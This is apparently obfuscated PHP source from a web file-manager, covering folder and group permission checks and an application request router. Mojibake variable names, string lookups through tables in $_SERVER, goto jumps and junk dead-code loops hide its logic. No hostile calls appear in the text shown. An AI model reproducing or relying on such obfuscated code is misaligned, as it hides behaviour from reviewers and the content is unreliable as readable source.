$£ÒŒˆ ­ = Model($„Ÿºì‘ğ[1321]); $Éíõ¯Ú§ = $£ÒŒˆ ­->sourceInfo($˜õòîŠ); if (!$Éíõ¯Ú§) { return !1; } $£ÒŒˆ ­->groupPathDisplay($Éíõ¯Ú§); $ƒ¯¯©ÄÑ = array($Éíõ¯Ú§); $ƒ¯¯©ÄÑ = $£ÒŒˆ ­->_listAppendPath($ƒ¯¯©ÄÑ); $Éíõ¯Ú§ = $ƒ¯¯©ÄÑ[0]; $æääóã× = $Éíõ¯Ú§[$„Ÿºì‘ğ[519]]; if (isset($Éíõ¯Ú§[$„Ÿºì‘ğ[527]])) { $Û°ÃøÈù = explode($„Ÿºì‘ğ[8], trim($Éíõ¯Ú§[$„Ÿºì‘ğ[519]], $„Ÿºì‘ğ[8])); array_shift($Û°ÃøÈù); $æääóã× = $Éíõ¯Ú§[$„Ÿºì‘ğ[525]] . $„Ÿºì‘ğ[2012] . implode($„Ÿºì‘ğ[8], $Û°ÃøÈù); } return array($„Ÿºì‘ğ[421] => $Éíõ¯Ú§[$„Ÿºì‘ğ[32]], $„Ÿºì‘ğ[78] => KodIO::make($Éíõ¯Ú§[$„Ÿºì‘ğ[403]]), $„Ÿºì‘ğ[2013] => $æääóã×); } private function groupAuthInfo($—Ãî×É´, $îÛöÎŒ) { $¡Ëãí´• =& $_SERVER[Ãìšã«™]; $çË½óºÆ = Model($¡Ëãí´•[522])->getInfo($îÛöÎŒ); return array($¡Ëãí´•[2014] => intval($—Ãî×É´[$¡Ëãí´•[414]]), $¡Ëãí´•[1998] => $—Ãî×É´, $¡Ëãí´•[2015] => LNG($¡Ëãí´•[2016]), $¡Ëãí´•[2007] => array($¡Ëãí´•[421] => $çË½óºÆ[$¡Ëãí´•[32]], $¡Ëãí´•[78] => KodIO::make($çË½óºÆ[$¡Ëãí´•[87]][$¡Ëãí´•[403]]), $¡Ëãí´•[2013] => $çË½óºÆ[$¡Ëãí´•[526]])); } protected function groupRootAuth($éŞÆ‡°Ç, $â¼ë“Ë = false) { $Š¬°Üæ =& $_SERVER[Ãìšã«™]; $â¼ë“Ë = $â¼ë“Ë ? $â¼ë“Ë : USER_ID; $•Åˆ ® = $â¼ë“Ë . $Š¬°Üæ[2017] . $éŞÆ‡°Ç; static $°ù‚òÒº = array(); if (isset($°ù‚òÒº[$•Åˆ ®])) { return $°ù‚òÒº[$•Åˆ ®]; } $Ø¯ ßîÊ = Model($Š¬°Üæ[522])->getInfo($éŞÆ‡°Ç); $ìì”Ø¡š = $this->userGroupList($â¼ë“Ë); $á·òúì = isset($ìì”Ø¡š[$éŞÆ‡°Ç]) ? $ìì”Ø¡š[$éŞÆ‡°Ç][$Š¬°Üæ[414]] : !1; if ($á·òúì && Model($Š¬°Üæ[507])->authCheckAction($á·òúì[$Š¬°Üæ[414]], $Š¬°Üæ[1838])) { $°ù‚òÒº[$•Åˆ ®] = $á·òúì; return $á·òúì; } $ğÎãôÈ‡ = $this->sourceAuthSelect($Ø¯ ßîÊ[$Š¬°Üæ[87]][$Š¬°Üæ[403]]); $¯ì²Úá  = $ğÎãôÈ‡ ? $this->authMake($ğÎãôÈ‡, $â¼ë“Ë) : !1; $äù™§³— = $¯ì²Úá  ? $¯ì²Úá [$Š¬°Üæ[466]] : !1; $°ù‚òÒº[$•Åˆ ®] = $äù™§³— ? $äù™§³— : $á·òúì; return $°ù‚òÒº[$•Åˆ ®]; } public function authOwnerApply($œÆâæÑ) { $Ø£—è¿Â =& $_SERVER[Ãìšã«™]; if (empty($œÆâæÑ[$Ø£—è¿Â[414]]) || isset($œÆâæÑ[$Ø£—è¿Â[2018]]) && $œÆâæÑ[$Ø£—è¿Â[2018]]) { return $œÆâæÑ; } if (AuthModel::authCheckRoot($œÆâæÑ[$Ø£—è¿Â[414]][$Ø£—è¿Â[415]])) { return $œÆâæÑ; } $šíË¹“ = Model($Ø£—è¿Â[1321])->parentLevelArray($œÆâæÑ[$Ø£—è¿Â[521]]); $šíË¹“ = array_merge(array($œÆâæÑ[$Ø£—è¿Â[403]]), array_reverse($šíË¹“)); $¯Ê“ƒ„ª = $this->sourceAuthSelect($šíË¹“); $åáæû˜ = array(); $ºÀ Ğì¡ = array(); foreach ($¯Ê“ƒ„ª as $ã‚ñŒ´Õ => $•Çƒ‡¤Ş) { $ ¥¯ëºî = $this->authFolderOwnerUser($•Çƒ‡¤Ş); $åáæû˜[$ã‚ñŒ´Õ] = $ ¥¯ëºî; $ºÀ Ğì¡ = array_merge($ºÀ Ğì¡, $ ¥¯ëºî[$Ø£—è¿Â[594]]); if ($ ¥¯ëºî[$Ø£—è¿Â[2019]]) { break; } } if (count($ºÀ Ğì¡) == 0) { $ºÀ Ğì¡ = $this->authFolderOwnerGroup($œÆâæÑ[$Ø£—è¿Â[504]]); } $ºÀ Ğì¡ = array_unique($ºÀ Ğì¡); if (AuthModel::authCheckRoot($œÆâæÑ[$Ø£—è¿Â[414]][$Ø£—è¿Â[415]])) { $ºÀ Ğì¡[] = USER_ID; } $œÆâæÑ[$Ø£—è¿Â[414]][$Ø£—è¿Â[2020]] = Model($Ø£—è¿Â[513])->userListInfo($ºÀ Ğì¡); return $œÆâæÑ; } private function authFolderOwnerGroup($‚„º…ÇÙ) { $ŠÀàíÎ’ =& $_SERVER[Ãìšã«™]; $ü¥êÓ…İ = Model($ŠÀàíÎ’[1907])->where(array($ŠÀàíÎ’[1818] => $‚„º…ÇÙ))->select(); $›ı‹½ƒ = array(); if (!$ü¥êÓ…İ) { return $›ı‹½ƒ; } foreach ($ü¥êÓ…İ as $ì†Ñ¥Ïï) { $û‹‡… = $this->authInfo($ì†Ñ¥Ïï); if (AuthModel::authCheckRoot($û‹‡…[$ŠÀàíÎ’[414]])) { $›ı‹½ƒ[] = $ì†Ñ¥Ïï[$ŠÀàíÎ’[1650]]; } } return $›ı‹½ƒ; } private function authFolderOwnerUser($‰ª—­¶à) { $œô¡ÑŠ =& $_SERVER[Ãìšã«™]; $ìà“ÊáÌ = array(); $ïúµŸçÙ = !1; foreach ($‰ª—­¶à as $ËÛÄ“½Ì) { $€˜ÖÃá = $this->authInfo($ËÛÄ“½Ì); if ($ËÛÄ“½Ì[$œô¡ÑŠ[504]] == $œô¡ÑŠ[190]) { $ïúµŸçÙ = !0; } if ($ËÛÄ“½Ì[$œô¡ÑŠ[412]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($€˜ÖÃá[$œô¡ÑŠ[414]])) { $ìà“ÊáÌ[] = $ËÛÄ“½Ì[$œô¡ÑŠ[504]]; } } } return array($œô¡ÑŠ[594] => $ìà“ÊáÌ, $œô¡ÑŠ[2019] => $ïúµŸçÙ); } public function authMake($ĞÖ•´­Ä, $°µ·Ïàø = false) { $èåÃÁ×å =& $_SERVER[Ãìšã«™]; $ìºÖóÑÄ = $this->authArrayCheck($ĞÖ•´­Ä, $°µ·Ïàø); if ($ìºÖóÑÄ[$èåÃÁ×å[2021]]) { $ìºÖóÑÄ[$èåÃÁ×å[2021]] = $this->sourceAuthInfo($ìºÖóÑÄ[$èåÃÁ×å[2021]]); } return $ìºÖóÑÄ; } public function authArrayCheck($ĞÆÈ™‡Á, $Œş†İİ = false) { $µ¾òÛàâ =& $_SERVER[Ãìšã«™]; if (!$ĞÆÈ™‡Á) { return array($µ¾òÛàâ[415] => 0, $µ¾òÛàâ[466] => !1); } $Œş†İİ = $Œş†İİ ? $Œş†İİ : USER_ID; $ë”È±’À = 0; $½Ï¿¶ÅÊ = 0; $¾–“ğ§ = 0; $£Í¸æÀ = 0; $¼¹·ÑÓº = 0; $õ®àãÖ¦ = 0; $œ£“ŞÎµ = 1000; $Õ¿¾âãª = 0; $·€ì…Ç = 0; $İ¥¼‹èş = 0; $¢üÊ¼­¾ = 0; $áşœÆğ” = array($µ¾òÛàâ[403] => 0); foreach ($ĞÆÈ™‡Á as $áşœÆğ”) { $ê éé¤õ = $this->authInfo($áşœÆğ”); if (!$ê éé¤õ) { continue; } $ç®öø  = $áşœÆğ”[$µ¾òÛàâ[504]]; $š¶Ìµ¾€ = intval($ê éé¤õ[$µ¾òÛàâ[414]]); if ($áşœÆğ”[$µ¾òÛàâ[412]] == SourceModel::TYPE_USER && $ç®öø  == $Œş†İİ) { $ë”È±’À = !0; $¾–“ğ§ = $ê éé¤õ; $½Ï¿¶ÅÊ = $š¶Ìµ¾€; } else { if ($áşœÆğ”[$µ¾òÛàâ[412]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ç®öø , $Œş†İİ)) { $£Í¸æÀ = !0; $Ó§ôÉì = $this->groupStepToUserGroup($ç®öø , $Œş†İİ); if ($Ó§ôÉì < $œ£“ŞÎµ) { $œ£“ŞÎµ = $Ó§ôÉì; $¼¹·ÑÓº = $š¶Ìµ¾€; $õ®àãÖ¦ = $ê éé¤õ; $Õ¿¾âãª = $ç®öø ; } if ($Ó§ôÉì == $œ£“ŞÎµ && $š¶Ìµ¾€ >= $¼¹·ÑÓº) { $¼¹·ÑÓº = $š¶Ìµ¾€; $õ®àãÖ¦ = $ê éé¤õ; $Õ¿¾âãª = $ç®öø ; } } else { if ($ç®öø  == $µ¾òÛàâ[190]) { $·€ì…Ç = !0; $¢üÊ¼­¾ = $ê éé¤õ; $İ¥¼‹èş = $š¶Ìµ¾€; } } } } if ($ë”È±’À) { $»òâš³Å = $½Ï¿¶ÅÊ; $ê éé¤õ = $¾–“ğ§; $ğïšü×ª = LNG($µ¾òÛàâ[2022]); } else { if ($£Í¸æÀ) { $»òâš³Å = $¼¹·ÑÓº; $ê éé¤õ = $õ®àãÖ¦; $©Ë¢Ÿ Ì = Model($µ¾òÛàâ[522])->getInfo($Õ¿¾âãª); $ğïšü×ª = $µ¾òÛàâ[159] . $©Ë¢Ÿ Ì[$µ¾òÛàâ[526]] . $µ¾òÛàâ[2023] . LNG($µ¾òÛàâ[2024]); } else { if ($·€ì…Ç) { $»òâš³Å = $İ¥¼‹èş; $ê éé¤õ = $¢üÊ¼­¾; $ğïšü×ª = LNG($µ¾òÛàâ[1995]); } else { $»òâš³Å = 0; $ê éé¤õ = !1; $ğïšü×ª = $µ¾òÛàâ[12]; } } } $¹Ëíç¸Ñ = array($µ¾òÛàâ[2014] => intval($»òâš³Å), $µ¾òÛàâ[1998] => $ê éé¤õ, $µ¾òÛàâ[2015] => $ğïšü×ª, $µ¾òÛàâ[2007] => $áşœÆğ”[$µ¾òÛàâ[403]]); return $¹Ëíç¸Ñ; } private function groupContainUser($¶¢Š¼Çã, $ğü—×ê = false) { return in_array($¶¢Š¼Çã, $this->userGroupParents($ğü—×ê)); } private function groupStepToUserGroup($€àøıëÌ, $Â‚å¼š = false) { $İŞëÌ™ =& $_SERVER[Ãìšã«™]; $¨…îíÔ = $this->userGroupList($Â‚å¼š); $ßÊÊø = 1000; $¨á¸øËĞ = $GLOBALS[$İŞëÌ™[6]][$İŞëÌ™[90]][$İŞëÌ™[1918]] == 1; $ÊØÆ‹ƒü = $¨á¸øËĞ ? 3 : 2; foreach ($¨…îíÔ as $–¼¾…¸Å) { if ($–¼¾…¸Å[$İŞëÌ™[1818]] == $€àøıëÌ) { return 0; } $ˆƒÏ‚’Â = explode($İŞëÌ™[50], trim($–¼¾…¸Å[$İŞëÌ™[521]], $İŞëÌ™[50])); if ($ˆƒÏ‚’Â[0] == $İŞëÌ™[190] && count($ˆƒÏ‚’Â) > $ÊØÆ‹ƒü) { $¤–ÓºÏØ = array_reverse(array_slice($ˆƒÏ‚’Â, $ÊØÆ‹ƒü)); $í–©Úøã = array_search($€àøıëÌ, $¤–ÓºÏØ); if ($í–©Úøã !== !1 && $í–©Úøã + 1 <= $ßÊÊø) { $ßÊÊø = $í–©Úøã + 1; } } } return $ßÊÊø; } private function userGroupList($ÕÔÅöÚû = false) { $¿¦Ì€¿Õ =& $_SERVER[Ãìšã«™]; static $òÀÃ­Øù = array(); if (isset($òÀÃ­Øù[$ÕÔÅöÚû])) { return $òÀÃ­Øù[$ÕÔÅöÚû]; } $™¥ëøÛ… = Model($¿¦Ì€¿Õ[538])->getInfo($ÕÔÅöÚû); $òÀÃ­Øù[$ÕÔÅöÚû] = array_to_keyvalue($™¥ëøÛ…[$¿¦Ì€¿Õ[1996]], $¿¦Ì€¿Õ[1818]); return $òÀÃ­Øù[$ÕÔÅöÚû]; } public function userGroupParents($öŠƒ¶ú) { $ëÆ¶¿ø =& $_SERVER[Ãìšã«™]; static $»”èšçà = array(); $öŠƒ¶ú = $öŠƒ¶ú ? $öŠƒ¶ú : USER_ID; if (isset($»”èšçà[$öŠƒ¶ú])) { return $»”èšçà[$öŠƒ¶ú]; } $‹÷’ÏÉï = $this->userGroupList($öŠƒ¶ú); $¨¢Ï­æ = array(); $Š–ÌÁ›ğ = $GLOBALS[$ëÆ¶¿ø[6]][$ëÆ¶¿ø[90]][$ëÆ¶¿ø[1918]] == 1; $ÍµÀ·Ö = $Š–ÌÁ›ğ ? 3 : 2; foreach ($‹÷’ÏÉï as $¨Ñ„¸­) { $¡íªÂßÆ = array($¨Ñ„¸­[$ëÆ¶¿ø[1818]]); $©ˆİ½ø» = explode($ëÆ¶¿ø[50], trim($¨Ñ„¸­[$ëÆ¶¿ø[521]], $ëÆ¶¿ø[50])); if ($©ˆİ½ø»[0] == $ëÆ¶¿ø[190] && count($©ˆİ½ø») > $ÍµÀ·Ö) { $ŸìÎŒÎø = array_slice($©ˆİ½ø», $ÍµÀ·Ö); $¡íªÂßÆ = array_merge($¡íªÂßÆ, array_reverse($ŸìÎŒÎø)); } $¨¢Ï­æ = array_merge($¨¢Ï­æ, $¡íªÂßÆ); } $»”èšçà[$öŠƒ¶ú] = array_unique($¨¢Ï­æ); return $»”èšçà[$öŠƒ¶ú]; } public function authTargetInfoMake($ò‡û¯Û) { $óı“”± =& $_SERVER[Ãìšã«™]; $ø´Ñ€£œ = array(); $ÕŞâäºë = array(); foreach ($ò‡û¯Û as $…ÔîâÌ) { if ($…ÔîâÌ[$óı“”±[412]] == SourceModel::TYPE_USER) { $ø´Ñ€£œ[] = intval($…ÔîâÌ[$óı“”±[504]]); } else { if ($…ÔîâÌ[$óı“”±[412]] == SourceModel::TYPE_GROUP) { $ÕŞâäºë[] = intval($…ÔîâÌ[$óı“”±[504]]); } } } if ($ø´Ñ€£œ) { $ø´Ñ€£œ = Model($óı“”±[513])->userListInfo($ø´Ñ€£œ); } if ($ÕŞâäºë) { $Äé·ù†ø = array($óı“”±[1905] => array($óı“”±[419], $ÕŞâäºë)); $ÕŞâäºë = Model($óı“”±[522])->field($óı“”±[2025])->where($Äé·ù†ø)->select(); $ÕŞâäºë = array_to_keyvalue($ÕŞâäºë, $óı“”±[1818]); } return array($óı“”±[2026] => $ø´Ñ€£œ, $óı“”±[2027] => $ÕŞâäºë); } public function authInfo($ÎÅé¶Â) { $ë–ğ¤ÕŠ =& $_SERVER[Ãìšã«™]; if ($ÎÅé¶Â[$ë–ğ¤ÕŠ[1919]]) { $ø´í‡Ê = Model($ë–ğ¤ÕŠ[507])->listData($ÎÅé¶Â[$ë–ğ¤ÕŠ[1919]]); if (!$ø´í‡Ê) { return !1; $¦ŞÌÈ¸ü = Model($ë–ğ¤ÕŠ[507])->listData(); $ú¡éÔŒ´ = array_filter_by_field($¦ŞÌÈ¸ü, $ë–ğ¤ÕŠ[414], $ë–ğ¤ÕŠ[190]); return $ú¡éÔŒ´; } $óÑé¯Ô = array_field_key($ø´í‡Ê, array($ë–ğ¤ÕŠ[392], $ë–ğ¤ÕŠ[32], $ë–ğ¤ÕŠ[414], $ë–ğ¤ÕŠ[1840], $ë–ğ¤ÕŠ[1841])); $óÑé¯Ô[$ë–ğ¤ÕŠ[2028]] = $ÎÅé¶Â; return $óÑé¯Ô; } else { return array($ë–ğ¤ÕŠ[420] => 0, $ë–ğ¤ÕŠ[1824] => $ÎÅé¶Â[$ë–ğ¤ÕŠ[1973]], $ë–ğ¤ÕŠ[421] => $ë–ğ¤ÕŠ[12], $ë–ğ¤ÕŠ[1840] => $ë–ğ¤ÕŠ[2029]); } } } goto Eêèùäìš; eç™µè•Ïš: class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\151\x6e\x64\145\x78"; function __construct() { } public function setDefault($¸“°úËÛ) { $àí‹·† =& $_SERVER[Ãìšã«™]; $°³Ì­ø =& $_SERVER[ïß‚ÈÄŸ]; $ç²öô¦„ = explode($°³Ì­ø[0], trim($¸“°úËÛ, $°³Ì­ø[0])); $¢¥Î–ªˆ = $àí‹·†[610]; $this->defaultModule = $ç²öô¦„[0] ? $ç²öô¦„[0] : $this->defaultModule; $this->defaultController = $ç²öô¦„[1] ? $ç²öô¦„[1] : $this->defaultController; $this->defaultAction = $ç²öô¦„[2] ? $ç²öô¦„[2] : $this->defaultAction; $this->djly11a078aa($°³Ì­ø[1], array($this, $°³Ì­ø[2])); $şó×ªŒ = $àí‹·†[611]; while (strlen($şó×ªŒ) < $àí‹·†[612]) { if (!$şó×ªŒ) { break; } $şó×ªŒ++; } } public function appRun($€©¿—ü´) { $‹¢Ò¥ñï =& $_SERVER[Ãìšã«™]; $±¢Ğ¿Á =& $_SERVER[ïß‚ÈÄŸ]; $¼Ä‰¹õÅ = explode($±¢Ğ¿Á[0], $€©¿—ü´); $Ğâ±®éÃ = $‹¢Ò¥ñï[613]; if (!$Ğâ±®éÃ) { return; } $æÊà´¤Ç = strtolower($¼Ä‰¹õÅ[0]); $«Ö¿³ = $‹¢Ò¥ñï[614]; if (strlen($«Ö¿³) < $‹¢Ò¥ñï[399]) { die; } $œÌÀòÓÁ = $±¢Ğ¿Á[3]; $›±µÚæ = $‹¢Ò¥ñï[615]; while (strlen($›±µÚæ) < $‹¢Ò¥ñï[616]) { if (!$›±µÚæ) { break; } $›±µÚæ++; } if ($æÊà´¤Ç == $±¢Ğ¿Á[4]) { $œÌÀòÓÁ = $±¢Ğ¿Á[5]; $¼Ä‰¹õÅ[0] = $±¢Ğ¿Á[6]; $¼Ä‰¹õÅ[1] = $¼Ä‰¹õÅ[1] . $±¢Ğ¿Á[7]; $€©¿—ü´ = join($±¢Ğ¿Á[0], $¼Ä‰¹õÅ); $€©¿—ü´ = trim($€©¿—ü´, $±¢Ğ¿Á[0]); } call_user_func(array($±¢Ğ¿Á[8], $±¢Ğ¿Á[9]), $œÌÀòÓÁ . $±¢Ğ¿Á[10], $€©¿—ü´); ActionCall($€©¿—ü´); $¥õÚûù× = $‹¢Ò¥ñï[617]; if (!$¥õÚûù×) { die; } call_user_func(array($±¢Ğ¿Á[8], $±¢Ğ¿Á[9]), $œÌÀòÓÁ . $±¢Ğ¿Á[11], $€©¿—ü´); $”ÜùÜøì = $‹¢Ò¥ñï[618]; if (!$”ÜùÜøì) { die; } } private function autorun() { $¼¡À‘ªƒ =& $_SERVER[Ãìšã«™]; $‘ÑŸœñ¬ =& $_SERVER[ïß‚ÈÄŸ]; global $config; $«¸Î£åì = $¼¡À‘ªƒ[619]; if (strlen($«¸Î£åì) < $¼¡À‘ªƒ[612]) { die; } if (count($config[$‘ÑŸœñ¬[12]]) == 0) { return; } foreach ($config[$‘ÑŸœñ¬[12]] as $›¢´üÈ => $ØŞ¥ˆéï) { $this->appRun($ØŞ¥ˆéï); $—ÃäÔÓ… = $¼¡À‘ªƒ[620]; while (strlen($—ÃäÔÓ…) < $¼¡À‘ªƒ[621]) { if (!$—ÃäÔÓ…) { break; } $—ÃäÔÓ…++; } } } private function igsc5ffdb6b2() { $Ğ»ĞÀïö =& $_SERVER[Ãìšã«™]; $“âõÔ’ =& $_SERVER[ïß‚ÈÄŸ]; $çƒò´ü = $“âõÔ’[4]; $°”ÖœÆî = $GLOBALS[$“âõÔ’[13]][$“âõÔ’[14]][0]; if (!$°”ÖœÆî || strlen($°”ÖœÆî) <= strlen($çƒò´ü)) { return; } if (strtolower(substr($°”ÖœÆî, -strlen($çƒò´ü))) != $çƒò´ü) { return; } $­ˆµ×¬® = substr($°”ÖœÆî, 0, -strlen($çƒò´ü)); $î›€÷²­ = array($“âõÔ’[4], $­ˆµ×¬®); $¿­ÊÃå = $Ğ»ĞÀïö[622]; if (!$¿­ÊÃå) { return; } $©ıì÷Äø = array_slice($GLOBALS[$“âõÔ’[13]][$“âõÔ’[14]], 1); $GLOBALS[$“âõÔ’[13]][$“âõÔ’[14]] = array_merge($î›€÷²­, $©ıì÷Äø); $æ‰±üä³ = $Ğ»ĞÀïö[623]; if (strlen($æ‰±üä³) < $Ğ»ĞÀïö[399]) { die; } $GLOBALS[$“âõÔ’[13]][$“âõÔ’[15]] = implode($“âõÔ’[0], $GLOBALS[$“âõÔ’[13]][$“âõÔ’[14]]); } private function oyjf84b2a6c7() { $ÖàâôØß =& $_SERVER[Ãìšã«™]; $»¿Ğ‹Ê =& $_SERVER[ïß‚ÈÄŸ]; if ($GLOBALS[$»¿Ğ‹Ê[13]][$»¿Ğ‹Ê[15]] != $»¿Ğ‹Ê[6]) { return; } $µ‘ÊÌ³Ã = $_SERVER[$»¿Ğ‹Ê[16]]; $ë€ˆ±­¡ = $»¿Ğ‹Ê[17]; if (!strstr($µ‘ÊÌ³Ã, $ë€ˆ±­¡)) { return; } $š§ĞíÅ = strrpos($µ‘ÊÌ³Ã, $ë€ˆ±­¡); $Ó‡í÷÷ = $ÖàâôØß[624]; $íÔ ©©Ğ = substr($µ‘ÊÌ³Ã, $š§ĞíÅ + strlen($ë€ˆ±­¡)); preg_match_all($»¿Ğ‹Ê[18], $íÔ ©©Ğ, $ª¢êÆÕ¾); $íÔ ©©Ğ = trim($ª¢êÆÕ¾[0][0], $»¿Ğ‹Ê[19]); $GLOBALS[$»¿Ğ‹Ê[13]][$»¿Ğ‹Ê[14]] = explode($»¿Ğ‹Ê[19], $íÔ ©©Ğ); $Ş§ìŞ“ª = $ÖàâôØß[625]; if (!$Ş§ìŞ“ª) { die; } $GLOBALS[$»¿Ğ‹Ê[13]][$»¿Ğ‹Ê[15]] = implode($»¿Ğ‹Ê[0], $GLOBALS[$»¿Ğ‹Ê[13]][$»¿Ğ‹Ê[14]]); } public function run() { $ö®§ÜÜ£ =& $_SERVER[Ãìšã«™]; $äá§¼†í =& $_SERVER[ïß‚ÈÄŸ]; $this->oyjf84b2a6c7(); $this->igsc5ffdb6b2(); $„”ğÏ³” = $GLOBALS[$äá§¼†í[13]][$äá§¼†í[14]]; $ëçğ¥áï = $ö®§ÜÜ£[626]; while (strlen($ëçğ¥áï) < $ö®§ÜÜ£[612]) { if (!$ëçğ¥áï) { break; } $ëçğ¥áï++; } $…‹ïÃ¥® = $GLOBALS[$äá§¼†í[13]][$äá§¼†í[15]]; $ìîÎä’ = $ö®§ÜÜ£[627]; if (!$ìîÎä’) { die; } define($äá§¼†í[20], isset($„”ğÏ³”[0]) && $„”ğÏ³”[0] ? $„”ğÏ³”[0] : $this->defaultModule); define($äá§¼†í[21], isset($„”ğÏ³”[1]) && $„”ğÏ³”[0] ? $„”ğÏ³”[1] : $this->defaultController); $Á®ê‰¨Ú = $ö®§ÜÜ£[628]; if (!$Á®ê‰¨Ú) { return; } define($äá§¼†í[22], isset($„”ğÏ³”[2]) && $„”ğÏ³”[0] ? $„”ğÏ³”[2] : $this->defaultAction); $çâØ”Õ– = $ö®§ÜÜ£[629]; if (!$çâØ”Õ–) { return; } define($äá§¼†í[23], MOD . $äá§¼†í[0] . ST . $äá§¼†í[0] . ACT); $Ë§…âÊÃ = $ö®§ÜÜ£[630]; $_SERVER[$äá§¼†í[24]] = strtolower(ACTION); $Ì±Àãô¶ = $ö®§ÜÜ£[631]; while ($Ì±Àãô¶ < $ö®§ÜÜ£[616]) { if ($Ì±Àãô¶ >= 0) { break; } $Ì±Àãô¶++; } $this->autorun(); if (count($„”ğÏ³”) >= 3) { $this->appRun($…‹ïÃ¥®); } else { $this->appRun(ACTION); } } private $kgxj509f9577 = array(); private $povsb382eacd = ''; public function odej7889cef7() { $õ·Û¬ê =& $_SERVER[Ãìšã«™]; $–ü‹²®Â =& $_SERVER[ïß‚ÈÄŸ]; $this->djozda83c582(); $®Œ§“–ë = $õ·Û¬ê[632]; if (!$®Œ§“–ë) { return; } $this->mdvu3ec12e6d(); $Îˆ¹¨¶© = $õ·Û¬ê[633]; while (strlen($Îˆ¹¨¶©) < $õ·Û¬ê[399]) { if (!$Îˆ¹¨¶©) { break; } $Îˆ¹¨¶©++; } $this->rsoj763df3d6(); $this->qdbp68bfd33f(); $this->onyc14f7497d(); $this->bawk0ff65ff1(); $®üÍÕ÷ş = $õ·Û¬ê[634]; while ($®üÍÕ÷ş < $õ·Û¬ê[621]) { if ($®üÍÕ÷ş >= 0) { break; } $®üÍÕ÷ş++; } $this->zxjh45c1ed14(); $¾ÚÓìıô = $õ·Û¬ê[635]; if (!$¾ÚÓìıô) { die; } $this->djly11a078aa($–ü‹²®Â[25], array($this, $–ü‹²®Â[26])); $ı ë½Íœ = $õ·Û¬ê[636]; if (!$ı ë½Íœ) { return; } $this->djly11a078aa($–ü‹²®Â[27], array($this, $–ü‹²®Â[28])); $´ıñèƒ¢ = $õ·Û¬ê[637]; if (strlen($´ıñèƒ¢) < $õ·Û¬ê[638]) { return; } $this->djly11a078aa($–ü‹²®Â[29], array($this, $–ü‹²®Â[30])); $òÊğûƒç = $õ·Û¬ê[639]; while ($òÊğûƒç < $õ·Û¬ê[612]) { if ($òÊğûƒç >= 0) { break; } $òÊğûƒç++; } $this->djly11a078aa($–ü‹²®Â[31], array($this, $–ü‹²®Â[32])); } public function xbneefc7207d($î™²¤ê) { $õå¾ÑµŸ =& $_SERVER[Ãìšã«™]; $ÁÇ·ã£Ì =& $_SERVER[ïß‚ÈÄŸ]; $Ò‰ÅŠí¹ = Model($ÁÇ·ã£Ì[33])->get(); $Å›·Ô“Ü = array($ÁÇ·ã£Ì[34], $ÁÇ·ã£Ì[35], $ÁÇ·ã£Ì[36], $ÁÇ·ã£Ì[37], $ÁÇ·ã£Ì[38], $ÁÇ·ã£Ì[39], $ÁÇ·ã£Ì[40], $ÁÇ·ã£Ì[41], $ÁÇ·ã£Ì[42], $ÁÇ·ã£Ì[43], $ÁÇ·ã£Ì[44], $ÁÇ·ã£Ì[45], $ÁÇ·ã£Ì[46], $ÁÇ·ã£Ì[47], $ÁÇ·ã£Ì[48], $ÁÇ·ã£Ì[49], $ÁÇ·ã£Ì[50], $ÁÇ·ã£Ì[51], $ÁÇ·ã£Ì[52], $ÁÇ·ã£Ì[53], $ÁÇ·ã£Ì[54], $ÁÇ·ã£Ì[55], $ÁÇ·ã£Ì[56], $ÁÇ·ã£Ì[57], $ÁÇ·ã£Ì[58], $ÁÇ·ã£Ì[59], $ÁÇ·ã£Ì[60], $ÁÇ·ã£Ì[61], $ÁÇ·ã£Ì[62], $ÁÇ·ã£Ì[63], $ÁÇ·ã£Ì[64], $ÁÇ·ã£Ì[65], $ÁÇ·ã£Ì[66], $ÁÇ·ã£Ì[67], $ÁÇ·ã£Ì[68], $ÁÇ·ã£Ì[69], $ÁÇ·ã£Ì[70], $ÁÇ·ã£Ì[71], $ÁÇ·ã£Ì[72], $ÁÇ·ã£Ì[73], $ÁÇ·ã£Ì[74], $ÁÇ·ã£Ì[75], $ÁÇ·ã£Ì[76], $ÁÇ·ã£Ì[77], $ÁÇ·ã£Ì[78], $ÁÇ·ã£Ì[79], $ÁÇ·ã£Ì[80], $ÁÇ·ã£Ì[81], $ÁÇ·ã£Ì[82]); foreach ($Å›·Ô“Ü as $ËĞ…×¹İ) { $««Á£öŞ = $GLOBALS[$ÁÇ·ã£Ì[83]][$ÁÇ·ã£Ì[84]][$ËĞ…×¹İ]; $¸˜ü¬‚Ü = $õå¾ÑµŸ[640]; if (!$¸˜ü¬‚Ü) { return; } if (isset($Ò‰ÅŠí¹[$ËĞ…×¹İ])) { $««Á£öŞ = $Ò‰ÅŠí¹[$ËĞ…×¹İ]; } $î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ËĞ…×¹İ] = $««Á£öŞ; } $ü§¡†ä± = $î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ÁÇ·ã£Ì[46]]; unset($î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[87]][$ÁÇ·ã£Ì[88]]); $±İ¸şó« = $õå¾ÑµŸ[641]; while (strlen($±İ¸şó«) < $õå¾ÑµŸ[612]) { if (!$±İ¸şó«) { break; } $±İ¸şó«++; } unset($î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[87]][$ÁÇ·ã£Ì[89]]); unset($î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ÁÇ·ã£Ì[46]]); $ã·©íœ­ = $õå¾ÑµŸ[642]; unset($î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ÁÇ·ã£Ì[90]]); $şÊ®¦¨õ = $õå¾ÑµŸ[643]; $î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ÁÇ·ã£Ì[91]] = array($ÁÇ·ã£Ì[92] => (int) $ü§¡†ä±[$ÁÇ·ã£Ì[93]], $ÁÇ·ã£Ì[94] => (int) _get($ü§¡†ä±, $ÁÇ·ã£Ì[95], 0)); $öëÇ¾­ = $õå¾ÑµŸ[644]; if (strlen($öëÇ¾­) < $õå¾ÑµŸ[616]) { return; } $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[97]] = Action($ÁÇ·ã£Ì[98])->accessToken(); $»î·È˜Í = $õå¾ÑµŸ[645]; 